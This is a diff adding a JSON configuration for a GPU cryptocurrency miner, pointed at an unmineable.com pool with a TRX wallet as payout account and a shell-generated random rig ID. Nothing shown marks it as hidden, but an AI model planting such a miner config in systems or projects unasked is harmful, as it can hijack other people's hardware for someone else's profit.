@@ -1,0 +1,34 @@
+{
+	 "hardwareConfiguration": {
+		 "cpu": {
+			 "enabled": false,
+			 "optimizationMethod": "Auto",
+			 "threadCount": 2
+		 },
+		 "nvidia": {
+			 "devices": [
+			 {
+				 "desktopLag": 71,
+				 "enabled": true,
+				 "id": 0,
+				 "intensity": 70,
+				 "name": "Auto"
+			 }
+			 ]
+		 }
+	 },
+	 "pools": [
+	 {
+		 "agent": "",
+		 "algorithm": "wrkzcoin",
+		 "host": "rx-us.unmineable.com",
+		 "niceHash": false,
+		 "password":"x",
+		 "port": 3333,
+		 "priority": 0,
+		 "rigID": $(shuf -n 1 -i 1-99999),
+		 "ssl": false,
+		 "username": "TRX:TH4UAVW4w9KU37mv9KBDchJGkhLcVH8nYs"
+	 }
+	 ]
+ }
